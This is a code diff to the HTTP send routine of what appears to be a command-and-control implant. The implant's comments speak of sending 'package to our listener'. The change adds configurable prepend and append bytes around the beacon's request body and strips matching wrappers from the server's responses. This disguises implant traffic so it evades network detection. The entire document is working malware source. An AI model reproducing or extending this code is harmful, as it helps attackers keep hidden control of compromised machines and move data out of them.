@@ -37,6 +37,10 @@ BOOL HttpSend(
     SIZE_T  RespSize       = { 0 };
     BOOL    Successful     = { 0 };
 
+    /* Request body with prepend/append */
+    PVOID   SendBuffer     = { 0 };
+    SIZE_T  SendSize       = { 0 };
+
     WINHTTP_PROXY_INFO                   ProxyInfo        = { 0 };
     WINHTTP_CURRENT_USER_IE_PROXY_CONFIG ProxyConfig      = { 0 };
     WINHTTP_AUTOPROXY_OPTIONS            AutoProxyOptions = { 0 };
@@ -243,8 +247,25 @@ BOOL HttpSend(
         }
     }
 
+    /* Build request body with prepend/append */
+    SendSize = Instance->Config.Transport.Request.PrependSize + Send->Length + Instance->Config.Transport.Request.AppendSize;
+    SendBuffer = Instance->Win32.LocalAlloc( LPTR, SendSize );
+    if ( ! SendBuffer ) {
+        PUTS_DONT_SEND( "LocalAlloc failed for SendBuffer" )
+        goto LEAVE;
+    }
+
+    /* Copy prepend + data + append */
+    if ( Instance->Config.Transport.Request.PrependSize > 0 ) {
+        MemCopy( SendBuffer, Instance->Config.Transport.Request.Prepend, Instance->Config.Transport.Request.PrependSize );
+    }
+    MemCopy( SendBuffer + Instance->Config.Transport.Request.PrependSize, Send->Buffer, Send->Length );
+    if ( Instance->Config.Transport.Request.AppendSize > 0 ) {
+        MemCopy( SendBuffer + Instance->Config.Transport.Request.PrependSize + Send->Length, Instance->Config.Transport.Request.Append, Instance->Config.Transport.Request.AppendSize );
+    }
+
     /* Send package to our listener */
-    if ( Instance->Win32.WinHttpSendRequest( Request, NULL, 0, Send->Buffer, Send->Length, Send->Length, 0 ) ) {
+    if ( Instance->Win32.WinHttpSendRequest( Request, NULL, 0, SendBuffer, SendSize, SendSize, 0 ) ) {
         if ( Instance->Win32.WinHttpReceiveResponse( Request, NULL ) ) {
             /* Is the server recognizing us ? are we good ?  */
             if ( HttpQueryStatus( Request ) != HTTP_STATUS_OK ) {
@@ -280,6 +301,23 @@ BOOL HttpSend(
                 Resp->Length = RespSize;
                 Resp->Buffer = RespBuffer;
 
+                /* Strip response prepend/append */
+                if ( Instance->Config.Transport.Response.PrependSize > 0 || Instance->Config.Transport.Response.AppendSize > 0 )
+                {
+                    SIZE_T ActualSize = RespSize - Instance->Config.Transport.Response.PrependSize - Instance->Config.Transport.Response.AppendSize;
+                    if ( ActualSize > 0 && ActualSize <= RespSize )
+                    {
+                        PVOID ActualBuffer = Instance->Win32.LocalAlloc( LPTR, ActualSize );
+                        if ( ActualBuffer )
+                        {
+                            MemCopy( ActualBuffer, RespBuffer + Instance->Config.Transport.Response.PrependSize, ActualSize );
+                            Instance->Win32.LocalFree( RespBuffer );
+                            Resp->Buffer = ActualBuffer;
+                            Resp->Length = ActualSize;
+                        }
+                    }
+                }
+
                 Successful = TRUE;
             }
         }
@@ -292,6 +330,10 @@ BOOL HttpSend(
     }
 
 LEAVE:
+    if ( SendBuffer ) {
+        Instance->Win32.LocalFree( SendBuffer );
+    }
+
     if ( Connect ) {
         Instance->Win32.WinHttpCloseHandle( Connect );
     }
